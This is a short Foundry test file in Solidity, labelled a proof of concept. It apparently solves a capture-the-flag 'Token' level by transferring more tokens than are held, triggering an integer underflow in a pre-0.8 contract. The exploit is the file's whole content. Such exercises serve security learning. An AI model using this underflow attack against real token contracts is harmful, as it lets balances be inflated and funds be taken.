// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../src/level5.sol";

contract POC is Test {
    Token level5 = new Token(20);

    function test() external {
        vm.startBroadcast();

        level5.transfer(address(0), 21);
        level5.balanceOf(msg.sender);

        vm.stopBroadcast();
    }
}
